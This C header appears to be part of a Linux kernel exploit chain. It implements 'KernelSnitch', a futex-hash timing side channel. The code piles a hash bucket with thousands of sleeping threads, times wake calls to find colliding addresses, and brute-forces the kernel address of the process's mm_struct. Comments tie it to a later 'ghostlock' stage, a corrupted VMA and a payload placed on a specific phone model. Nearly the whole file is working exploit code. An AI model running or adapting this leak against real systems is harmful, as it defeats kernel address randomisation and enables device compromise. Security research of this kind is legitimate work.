#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#define APPENDED_FUTEXES 4096
#define KS_COLLIDER_MAX 40   /* how many verified colliders we keep for scoring */
#define MULITPLE 4
/* how much slower than the pre-pile baseline a true same-bucket collider must
 * get. The stock PoC hardcodes 3x; on PD2118 the wake path is short enough
 * that measure() noise alone can exceed that, so make it tunable. */
#ifndef KERNELSNITCH_GROWTH_MULT
#define KERNELSNITCH_GROWTH_MULT 3
#endif
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    volatile size_t verified_cnt;  /* colliders that survived re-measurement */
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    volatile size_t identity_end;   /* runtime-clamped scan window end */
    volatile size_t ram_bytes;      /* detected MemTotal, for post-validation */

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;

    pthread_t *tids;
    size_t identity_diff;

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
    size_t core;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    size_t core = inc_arg->core;
    /* pin this piled waiter away from the measuring core to avoid preempting it */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    pthread_t tid;
    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 2) ncpus = 2;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
    }
    WAIT();
}

/**
 * Simple compare
 */
#define REPEAT_MEASUREMENT 128
#define AVERAGE (1<<3)
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
    for (size_t l = 0; l < AVERAGE; ++l)
        time += __times[l];
    time /= AVERAGE;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
        {
            size_t coarse_end = coarse_addr + COARSE_SZ;
            if (coarse_end > range->end) coarse_end = range->end;
            for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
                size_t slab_end = slab_addr + mm_slab_sz;
                if (slab_end > coarse_end) slab_end = coarse_end;
                for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate (hoist the pivot hash: with
                    // 8 colliders the naive form recomputed it 16x per candidate)
                    size_t h0 = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                        found_hash = (h0 == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->identity_end = IDENTITY_END;
    ks->ram_bytes = 0;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(KS_COLLIDER_MAX + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

static size_t __count_single_matches(struct kernelsnitch_shared_state *ks);

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 5
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    /* robust empty-bucket baseline: min over several probes */
    size_t approx_time = __measure((size_t)&ks->futexes[0]);
    for (int probe = 1; probe < 6; probe++) {
        size_t t = __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8 + probe * 64]);
        if (t < approx_time) approx_time = t;
    }

    /* two-phase measurement: only accept addresses whose wake time grows
     * significantly once OUR bucket is piled - this isolates true same-bucket
     * colliders from system-noise/contended-bucket false positives */
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);

    /* phase 1: pre-pile wake times */
    size_t total = ks->total_futexes;
    size_t *t_before = calloc(total, sizeof(size_t));
    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        t_before[i] = __measure((size_t)&ks->futexes[id]);
    }

    /* pile the bucket */
    __increase(ks, ID, APPENDED_FUTEXES);
    if (ks->verbose) pr_info("start finding collisisons\n");

    /* __increase() only yields twice; it does not wait for the 4096 waiters to
     * actually reach FUTEX_WAIT. Poll the target bucket until the pile shows up
     * (or give up), otherwise the post-pile phase measures a half-built pile and
     * the number of detected colliders swings from 1 to 30. */
    size_t pile_t = 0;
    for (int spin = 0; spin < 700; ++spin) {
        pile_t = __measure(ks->futex_addrs[0]);
        if (pile_t > approx_time * 20) break;
        usleep(3000);
    }
    if (ks->verbose) pr_info("pile settled after %zu ticks (baseline=%zu)\n",
                             pile_t, approx_time);

    size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
    if (pile_t / 4 > threshold) threshold = pile_t / 4;
    if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
                             approx_time, threshold);
    size_t slow_cnt = 0;
    size_t grown_total = 0;
    size_t tgt_after = __measure(ks->futex_addrs[0]);
    if (ks->verbose) pr_info("pile check: target after=%zu (baseline=%zu)\n",
                             tgt_after, approx_time);
    /* phase 2: post-pile; require both slow AND grown vs pre-pile.
     * Take the SLOWEST candidates rather than the first ones in scan order:
     * only ~half of the addresses that clear the threshold really share the
     * piled bucket, and a false positive makes the brute-force unsolvable. */
    #define CANDS_MAX 512
    static size_t cand_t[CANDS_MAX];
    static size_t cand_a[CANDS_MAX];
    size_t ncand = 0;
    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(futex_addr);
        if (ks->times[i] > threshold) {
            slow_cnt++;
            if (ks->times[i] > t_before[i] * KERNELSNITCH_GROWTH_MULT) {
                grown_total++;
                if (ncand < CANDS_MAX) {
                    cand_t[ncand] = ks->times[i];
                    cand_a[ncand] = futex_addr;
                    ncand++;
                }
            }
        }
    }
    for (size_t a = 0; a < ncand && count < wanted; ++a) {
        size_t best = a;
        for (size_t b = a + 1; b < ncand; ++b) {
            if (cand_t[b] > cand_t[best]) best = b;
        }
        size_t t = cand_t[a], ad = cand_a[a];
        cand_t[a] = cand_t[best];
        cand_a[a] = cand_a[best];
        cand_t[best] = t;
        cand_a[best] = ad;
    }
    /* A single slow reading is not proof: the pile keeps the bucket hot, but
     * scheduling noise produces one-off spikes too. Re-measure every candidate
     * several times and keep only the ones that stay slow; one false positive
     * makes the brute-force unsolvable (3 constraints -> ~1e-3 false hits). */
    #define VERIFY_REPS 5
    size_t survivors = 0;
    for (size_t a = 0; a < ncand; ++a) {
        size_t reps[VERIFY_REPS];
        for (int r = 0; r < VERIFY_REPS; ++r) {
            reps[r] = __measure(cand_a[a]);
        }
        for (int i = 1; i < VERIFY_REPS; ++i) {
            size_t v = reps[i];
            int j = i - 1;
            while (j >= 0 && reps[j] > v) {
                reps[j + 1] = reps[j];
                j--;
            }
            reps[j + 1] = v;
        }
        size_t med = reps[VERIFY_REPS / 2];
        if (med > threshold) {
            cand_t[survivors] = med;
            cand_a[survivors] = cand_a[a];
            survivors++;
        }
    }
    for (size_t a = 0; a < survivors && count < KS_COLLIDER_MAX; ++a) {
        size_t best = a;
        for (size_t b = a + 1; b < survivors; ++b) {
            if (cand_t[b] > cand_t[best]) best = b;
        }
        size_t t = cand_t[a], ad = cand_a[a];
        cand_t[a] = cand_t[best];
        cand_a[a] = cand_a[best];
        cand_t[best] = t;
        cand_a[best] = ad;
        count++;
        ks->futex_addrs[count] = cand_a[a];
        if (ks->verbose) pr_info("  %016zx (median=%zu)\n", cand_a[a], cand_t[a]);
    }
    if (ks->verbose) pr_info("phase2 slow>thr=%zu grown=%zu verified=%zu picked=%zu (growth x%d)\n",
                             slow_cnt, grown_total, survivors, count,
                             KERNELSNITCH_GROWTH_MULT);
    ks->verified_cnt = count;
    free(t_before);
    /* wake/clear the piled bucket so the next retry's two-phase measurement
     * starts from a clean (unpiled) baseline */
    __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE,
            APPENDED_FUTEXES + 16, NULL, NULL, 0);

    /* >=6 verifiers: with hashsize 2048 a 3/3 or 4/4 match still yields ~1
     * false positive across the whole 255 GB window, and a bogus mm_struct
     * silently poisons every later stage (payload lands in the wrong page). */
    if (count >= 6) {
        if (ks->verbose) pr_info("found %zd collisisons (wanted %zu)\n", count, wanted);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
        if (ks->verbose) {
            size_t m = __count_single_matches(ks);
            size_t span = (ks->identity_end ? ks->identity_end
                                            : KERNELSNITCH_IDENTITY_END) -
                          KERNELSNITCH_IDENTITY_START;
            size_t cands = span / (KS_PAGE_SIZE << ks->mm_slab_order) *
                           ((KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz);
            pr_info("calib: single-match hits=%zu of %zu candidates "
                    "(expect ~%zu with hashsize 0x%lx)\n",
                    m, cands, cands / futex_hashsize, futex_hashsize);
        }
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
}
/* calibration probe: with a single hash equality the model should accept
 * roughly (scanned candidates)/futex_hashsize addresses. Far off from that
 * means our replica of hash_futex()/hashsize does not match the kernel and the
 * brute-force can never succeed. */
static size_t __count_single_matches(struct kernelsnitch_shared_state *ks)
{
    size_t n = 0;
    size_t slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t end = ks->identity_end ? ks->identity_end : KERNELSNITCH_IDENTITY_END;
    /* sample the first 2 GB only: the expected hit rate (1/hashsize) does not
     * need the whole 256 GB region, and this is a diagnostic */
    size_t limit = KERNELSNITCH_IDENTITY_START + (2ULL << 30);
    if (end > limit) end = limit;
    for (size_t base = KERNELSNITCH_IDENTITY_START; base < end; base += slab_sz) {
        for (size_t c = base; c < base + slab_sz && c < end; c += ks->mm_struct_sz) {
            if (futex_hash(ks->futex_addrs[0], c) == futex_hash(ks->futex_addrs[1], c))
                n++;
        }
    }
    return n;
}

size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks){
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
/* Scoring scan: instead of demanding that ALL colliders agree (one false
 * collider then makes the whole scan unsatisfiable), count how many of the
 * verified colliders agree for each candidate and keep the best. With >=3
 * agreeing constraints a random candidate wins with probability ~2^-33, so the
 * winner is the mm_struct even if a few collider picks were noise. */
static void __probe_hash_layouts(struct kernelsnitch_shared_state *ks)
{
    size_t nver = ks->verified_cnt;
    if (nver > 8) nver = 8;
    size_t slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t best[2] = {0, 0};
    size_t besta[2] = {0, 0};
    for (size_t base = IDENTITY_START; base < ks->identity_end; base += slab_sz) {
        size_t slab_end = base + slab_sz;
        if (slab_end > ks->identity_end) slab_end = ks->identity_end;
        for (size_t cand = base; cand < slab_end; cand += ks->mm_struct_sz) {
            for (int L = 0; L < 2; ++L) {
                size_t h0 = futex_hash_layout(ks->futex_addrs[0], cand, L);
                size_t score = 0;
                for (size_t i = 1; i <= nver; ++i) {
                    if (futex_hash_layout(ks->futex_addrs[i], cand, L) == h0) score++;
                }
                if (score > best[L]) {
                    best[L] = score;
                    besta[L] = cand;
                }
            }
        }
    }
    for (int L = 0; L < 2; ++L) {
        pr_info("layout%d: best=%zu/%zu at %016zx\n", L, best[L], nver, besta[L]);
    }
}

struct score_arg {
    struct kernelsnitch_shared_state *ks;
    size_t start, end, nver;
    size_t best, bestaddr;
};

/* Candidate stride. SLAB_HWCACHE_ALIGN guarantees 64-byte object alignment for
 * mm_struct (kmem_cache_create_usercopy("mm_struct", 0x3a8, 0,
 * SLAB_HWCACHE_ALIGN|...)), so this is order-independent: we do NOT need to
 * know the slab order or the exact object size, both of which are easy to get
 * wrong (0x3c0/order3 and 0x340/order0 were both tried and both miss).
 *
 * Pruning: after the pivot, one more collider rejects 2047/2048 of the
 * candidates, so the cost is ~2 hashes per address, not nver. */
#define KS_SCAN_STRIDE 64

static void *__mm_score_worker(void *arg)
{
    struct score_arg *a = (struct score_arg *)arg;
    struct kernelsnitch_shared_state *ks = a->ks;
    size_t nver = a->nver;
    a->best = 0;
    a->bestaddr = (size_t)-1;
    for (size_t cand = a->start; cand < a->end; cand += KS_SCAN_STRIDE) {
        size_t h0 = futex_hash(ks->futex_addrs[0], cand);
        if (futex_hash(ks->futex_addrs[1], cand) != h0) continue;
        size_t score = 1;
        for (size_t i = 2; i < nver; ++i) {
            if (futex_hash(ks->futex_addrs[i], cand) == h0) score++;
        }
        if (score > a->best) {
            a->best = score;
            a->bestaddr = cand;
        }
        if (score + 1 >= nver) break;   /* every collider agrees */
    }
    return 0;
}

static void __mm_score_scan(struct kernelsnitch_shared_state *ks)
{
    size_t nver = ks->verified_cnt;
    if (nver < 1) nver = 1;
    if (nver > KS_COLLIDER_MAX) nver = KS_COLLIDER_MAX;
    if (nver < 3) {
        if (ks->verbose) pr_info("score scan: only %zu colliders, need >=3\n", nver);
        return;
    }
    /* tolerate one bad collider once we have plenty, but demand all when few */
    /* one tolerance at most: 2 of 6 missing already gives ~5e-4 odds of a
     * false hit somewhere in 4.3e9 candidates */
    size_t need = nver - 1;
    if (need < 5) need = 5;

    size_t start = IDENTITY_START;
    size_t end = ks->identity_end;
    size_t nthread = ks->thread_cnt ? ks->thread_cnt : 1;
    size_t span = (end - start) / nthread;
    span &= ~(size_t)(KS_SCAN_STRIDE - 1);
    if (!span) span = KS_SCAN_STRIDE;

    struct score_arg *args = (struct score_arg *)SYSCHK(
        calloc(nthread, sizeof(struct score_arg)));
    pthread_t *tids = (pthread_t *)SYSCHK(calloc(nthread, sizeof(pthread_t)));
    size_t launched = 0;
    for (size_t t = 0; t < nthread; ++t) {
        args[t].ks = ks;
        args[t].start = start + span * t;
        args[t].end = start + span * (t + 1);
        if (args[t].end > end) args[t].end = end;
        args[t].nver = nver;
        if (args[t].start >= end) {
            args[t].start = args[t].end = end;
            tids[t] = 0;
            continue;
        }
        if (pthread_create(&tids[t], 0, __mm_score_worker, &args[t])) {
            pr_warning("score scan thread %zu failed\n", t);
            tids[t] = 0;
            args[t].start = args[t].end = end;
            continue;
        }
        launched++;
    }
    for (size_t t = 0; t < nthread; ++t) {
        if (tids[t]) pthread_join(tids[t], 0);
    }
    size_t best_score = 0, best_addr = (size_t)-1;
    for (size_t t = 0; t < nthread; ++t) {
        if (args[t].best > best_score) {
            best_score = args[t].best;
            best_addr = args[t].bestaddr;
        }
    }
    free(args);
    free(tids);
    if (ks->verbose) pr_info("score scan (%zu thr, stride %d): best=%zu/%zu at %016zx (need %zu)\n",
                             launched, KS_SCAN_STRIDE, best_score + (best_addr != (size_t)-1),
                             nver, best_addr, need);
    if (best_addr != (size_t)-1 && best_score + 1 >= need) {
        ks->mm_struct = best_addr;
        ks->found = 1;
        if (ks->verbose) pr_info("mm_struct %016zx (score %zu/%zu)\n", best_addr,
                                 best_score + 1, nver);
    }
}

void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    /* hash-model diagnostics are cheap only for a small window; with the
     * 256 GB linear region they cost more than the real scan, and the model is
     * already instruction-level verified, so they stay off. */
    if (getenv("KERNELSNITCH_PROBE_LAYOUT")) {
        __probe_hash_layouts(ks);
    }

    __mm_score_scan(ks);
    if (ks->found) {
        ks->state = KERNELSNITCH_MM_FOUND;
        return;
    }

    size_t span = (ks->identity_end - IDENTITY_START) / ks->thread_cnt;
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start = IDENTITY_START + span*i;
        mm_leak_arg->range.end = IDENTITY_START + span*(i+1);
        if (mm_leak_arg->range.end > ks->identity_end) {
            mm_leak_arg->range.end = ks->identity_end;
        }
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(KS_COLLIDER_MAX + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    /* NB: the unmaps are deliberately skipped (GHOSTLOCK_KS_KEEP_MAPS=1 closes
     * that gap). On PD2118 the kernel panics exactly on munmap(ks) -- the
     * ghostlock stage runs before this and a corrupted VMA/anon_vma would be
     * dereferenced by munmap -- and the process is short-lived anyway. */
    if (!getenv("GHOSTLOCK_KS_KEEP_MAPS")) {
        munmap(ks, sizeof(struct kernelsnitch_shared_state));
    } else if (ks->verbose) {
        pr_info("keeping kernelsnitch maps (skip munmap(ks))\n");
    }
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 2; i < ks->collisions; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
}
